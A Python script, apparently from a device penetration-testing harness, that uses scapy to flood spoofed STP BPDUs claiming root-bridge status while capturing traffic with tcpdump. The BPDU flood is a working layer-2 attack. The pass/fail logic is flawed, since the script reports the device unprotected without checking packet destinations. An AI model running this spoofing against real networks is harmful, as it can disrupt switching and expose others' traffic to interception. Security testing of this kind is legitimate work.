from scapy.layers.l2 import Ether, LLC, STP
from scapy.all import *
import processes
from fTester import F_Tester

# iface = "enx1c860b27ed4b"
# dst_ip="192.168.0.101"
# dst_mac = "01:80:C2:00:00:00"
# src_mac=get_if_hwaddr(iface)
# print(src_mac)
APP_ROOT = os.path.dirname(os.path.abspath(__file__))

CONFIG_PATH       = os.path.join(APP_ROOT, "config.json")
CAPTURES_DIR      = os.path.join(APP_ROOT, "captures")
TEST_CONFIGS_DIR  = os.path.join(APP_ROOT, "test_configs")
TEST_RESULTS_DIR  = os.path.join(APP_ROOT, "test_results")


def test(interface):
    dst_mac = "01:80:C2:00:00:00"
    src_mac=get_if_hwaddr(interface)
    dst_ip="192.168.0.101"
    # rootid = (priority << 48) | mac_int
    # bridgeid = (priority << 48) | mac_int

    bpdu = (
        Ether(dst=dst_mac, src=src_mac) /
        LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
        STP(
            rootid=0,
            bridgeid=0,
            pathcost=0,
            portid=0x8001,
            # messageage=0,
            maxage=20,
            hellotime=2,
            fwddelay=15
        )
    )

    print("Sending spoofed STP BPDUs as root bridge...")
    for _ in range(20):
        for _ in range(100):
            sendp(bpdu, iface=interface, verbose=False)
        time.sleep(1)
    print("Spoofing ended")


def readPcapFiltered(filename):
    packets = rdpcap(filename)
    tcp_packets_info = []
    for pkt in packets:
        if pkt.haslayer("IP") and pkt.haslayer("TCP"):
            ip_layer = pkt["IP"]
            tcp_layer = pkt["TCP"]
            packet_info = {
                "Source IP": ip_layer.src,
                "Destination IP": ip_layer.dst,
                "Source Port": tcp_layer.sport,
                "Destination Port": tcp_layer.dport,
                "Flags": tcp_layer.flags,
                "Seq": tcp_layer.seq,
                "Ack": tcp_layer.ack
            }
            tcp_packets_info.append(packet_info)
    return tcp_packets_info

def runRstpAttack(interface, client):
    tcpdump = None
    try:
        tcpdump = processes.runTCPDump(interface, "rstpAttackCapture.pcap")
        time.sleep(10)
        tester = F_Tester(client)
        tester.startTest("connectionSpeed.json")
        test(interface)
    except KeyboardInterrupt:
        print("\nProcess was interrupted by user")
    except Exception as e:
        print(f"Unexpected error during test: {e}")
    finally:
        print("Terminating tcpdump")
        processes.terminate_process(tcpdump, "Tcpdump")

    try:
        capture_file = os.path.join(CAPTURES_DIR, "rstpAttackCapture.pcap")
        packets = readPcapFiltered(capture_file)
        print(f"{len(packets)} packets were captured that were not addressed to this device")
        print("The device is not protected")
    except Exception:
        print("Penetration test did not capture any foreign packets")

# runRstpAttack("enx1c860b27ed4b")
